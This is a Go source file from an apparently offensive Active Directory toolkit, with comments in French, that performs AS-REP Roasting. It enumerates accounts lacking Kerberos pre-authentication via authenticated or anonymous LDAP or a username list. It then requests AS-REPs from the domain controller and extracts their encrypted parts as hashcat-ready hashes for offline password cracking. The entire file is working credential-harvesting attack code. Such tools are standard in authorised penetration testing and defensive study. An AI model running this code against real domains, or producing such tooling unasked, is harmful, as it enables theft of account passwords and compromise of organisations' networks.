// pkg/kerberos/asreproast.go

package kerberos

import (
	"context"
	"fmt"
	"os"
	"strings"

	"adgo/pkg/ldap"

	goldap "github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ============================================================
// Types
// ============================================================

// ASREPRoastResult résultat d'un AS-REP Roasting pour un compte
type ASREPRoastResult struct {
	Username   string
	Domain     string
	Hash       HashcatHash
	Vulnerable bool
	Error      string
}

// ============================================================
// ASREPRoast AVEC credentials (LDAP enum + AS-REQ)
// ============================================================

// ASREPRoastWithCreds énumère les comptes AS-REP roastables via LDAP
// (userAccountControl:DONT_REQUIRE_PREAUTH) puis envoie une AS-REQ pour chacun.
func ASREPRoastWithCreds(username, password, domain, dcIP, outputFile string) ([]ASREPRoastResult, error) {
	fmt.Printf("[*] ASREPRoast — enumerating vulnerable accounts on %s...\n", domain)

	ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
	bindDN := fmt.Sprintf("%s@%s", username, domain)

	ldapClient, err := ldap.NewClient(context.Background(), ldapURL, bindDN, password, false)
	if err != nil {
		return nil, fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer ldapClient.Close()

	targets, err := enumerateASREPTargets(ldapClient.Conn(), domainToBaseDN(domain))
	if err != nil {
		return nil, fmt.Errorf("LDAP enumeration failed: %v", err)
	}

	if len(targets) == 0 {
		fmt.Println("[-] No AS-REP roastable accounts found")
		return nil, nil
	}

	fmt.Printf("[+] Found %d AS-REP roastable account(s)\n", len(targets))

	results := sendASReqs(targets, domain, dcIP)
	persistResults(results, outputFile)
	return results, nil
}

// ============================================================
// ASREPRoast SANS credentials
// ============================================================

// ASREPRoastNoCreds envoie des AS-REQ sans pré-auth pour une liste d'utilisateurs.
//   - usersFile non vide : tester la liste fournie (recommandé)
//   - usersFile vide     : tente un bind LDAP anonyme (bloqué sur la majorité des DCs modernes)
func ASREPRoastNoCreds(usersFile, domain, dcIP, outputFile string) ([]ASREPRoastResult, error) {
	var targets []string
	var err error

	if usersFile != "" {
		fmt.Printf("[*] ASREPRoast (no creds) — %s | domain: %s\n", usersFile, domain)
		targets, err = readLinesFromFile(usersFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read users file: %v", err)
		}
		fmt.Printf("[*] Loaded %d usernames\n", len(targets))
	} else {
		// Tentative d'énumération LDAP anonyme
		fmt.Printf("[*] ASREPRoast (anonymous LDAP) — %s\n", dcIP)
		rawConn, err := goldap.DialURL(fmt.Sprintf("ldap://%s:389", dcIP))
		if err != nil {
			return nil, fmt.Errorf("LDAP connection failed: %v", err)
		}
		defer rawConn.Close()

		targets, err = enumerateASREPTargetsAnonymous(rawConn, domainToBaseDN(domain))
		if err != nil {
			return nil, fmt.Errorf("anonymous LDAP enumeration failed: %v\n"+
				"[*] Tip: provide a users list with --users users.txt", err)
		}

		if len(targets) == 0 {
			fmt.Println("[-] Anonymous LDAP returned no results (likely blocked on this DC)")
			fmt.Println("[*] Try: adgo kerberos asreproast --users users.txt --dc-ip <IP> -d <domain>")
			return nil, nil
		}
	}

	fmt.Printf("[*] Sending AS-REQ for %d account(s)...\n", len(targets))
	results := sendASReqs(targets, domain, dcIP)
	persistResults(results, outputFile)
	return results, nil
}

// ============================================================
// Envoi des AS-REQ via gokrb5 client.ASExchange
// ============================================================

// sendASReqs envoie une AS-REQ sans pré-auth pour chaque username
// et retourne les résultats avec hashes hashcat mode 18200
func sendASReqs(usernames []string, domain, dcIP string) []ASREPRoastResult {
	var results []ASREPRoastResult

	realm := strings.ToUpper(domain)
	cfg, err := config.NewFromString(buildKrb5Config(realm, dcIP))
	if err != nil {
		fmt.Printf("[!] Kerberos config error: %v\n", err)
		return results
	}

	for _, username := range usernames {
		fmt.Printf("[*] AS-REQ → %-30s ", username+"@"+realm)
		result := sendOneASReq(username, realm, cfg)
		results = append(results, result)

		switch {
		case result.Vulnerable:
			fmt.Printf("VULNERABLE — enctype %d\n  %s\n", result.Hash.EncType, result.Hash.Hash)
		case result.Error != "":
			fmt.Printf("%s\n", result.Error)
		}
	}

	return results
}

// sendOneASReq envoie une AS-REQ pour un utilisateur et parse la réponse.
// Utilise messages.NewASReqForTGT qui construit une AS-REQ sans PA-ENC-TIMESTAMP.
// Pour les comptes avec DONT_REQUIRE_PREAUTH, le KDC répond directement avec l'AS-REP.
func sendOneASReq(username, realm string, cfg *config.Config) ASREPRoastResult {
	result := ASREPRoastResult{Username: username, Domain: realm}

	// Principal name du compte cible
	cname := types.PrincipalName{
		NameType:   1, // NT_PRINCIPAL
		NameString: []string{username},
	}

	// Construire la AS-REQ sans pré-authentification
	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		result.Error = fmt.Sprintf("AS-REQ build failed: %v", err)
		return result
	}

	// Client minimal pour le transport réseau vers le KDC
	cl := client.NewWithPassword(username, realm, "", cfg,
		client.DisablePAFXFAST(true))

	// Envoyer la AS-REQ et recevoir la AS-REP
	// cl.ASExchange gère le transport UDP/TCP vers le KDC (port 88)
	asRep, err := cl.ASExchange(realm, asReq, 0)
	if err != nil {
		errStr := err.Error()
		switch {
		case strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED"):
			// Le DC exige la pré-auth → compte non vulnérable
			result.Error = "requires pre-auth (not vulnerable)"
		case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
			result.Error = "user not found"
		case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
			result.Error = "account disabled or locked"
		case strings.Contains(errStr, "KDC_ERR_CLIENT_NOT_TRUSTED"):
			result.Error = "client not trusted"
		default:
			result.Error = fmt.Sprintf("KDC: %v", err)
		}
		return result
	}

	// Succès : le KDC a renvoyé une AS-REP sans vérifier la pré-auth
	// EncPart.Cipher = enc-part chiffrée avec la clé dérivée du mot de passe
	encBytes := asRep.EncPart.Cipher
	encType := asRep.EncPart.EType

	if len(encBytes) == 0 {
		result.Error = "empty encrypted part in AS-REP"
		return result
	}

	result.Vulnerable = true
	// CORRECTION : Conversion int32 → int
	result.Hash = FormatASREPRoastHash(username, realm, encBytes, int(encType))
	return result
}

// ============================================================
// Enumération LDAP
// ============================================================

// enumerateASREPTargets cherche les comptes avec DONT_REQUIRE_PREAUTH activé
// Filtre : userAccountControl bit 22 (0x400000 = 4194304)
func enumerateASREPTargets(conn *goldap.Conn, baseDN string) ([]string, error) {
	req := goldap.NewSearchRequest(
		baseDN,
		goldap.ScopeWholeSubtree,
		goldap.NeverDerefAliases,
		0, 0, false,
		// DONT_REQUIRE_PREAUTH activé ET compte non désactivé
		"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
		[]string{"sAMAccountName"},
		nil,
	)

	sr, err := conn.Search(req)
	if err != nil {
		return nil, err
	}

	var users []string
	for _, entry := range sr.Entries {
		if name := entry.GetAttributeValue("sAMAccountName"); name != "" {
			users = append(users, name)
		}
	}
	return users, nil
}

// enumerateASREPTargetsAnonymous essaie le bind LDAP anonyme avant l'énumération
func enumerateASREPTargetsAnonymous(conn *goldap.Conn, baseDN string) ([]string, error) {
	if err := conn.UnauthenticatedBind(""); err != nil {
		return nil, fmt.Errorf("anonymous bind refused by DC: %v", err)
	}
	return enumerateASREPTargets(conn, baseDN)
}

// ============================================================
// Helpers
// ============================================================

func persistResults(results []ASREPRoastResult, outputFile string) {
	var hashes []HashcatHash
	for _, r := range results {
		if r.Vulnerable && r.Hash.Hash != "" {
			hashes = append(hashes, r.Hash)
		}
	}
	if len(hashes) == 0 {
		fmt.Println("[-] No vulnerable accounts found")
		return
	}
	PrintHashcatHashes(hashes)
	SaveHashcatFile(hashes, outputFile) // outputFile vide = nom auto
}

func readLinesFromFile(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, nil
}
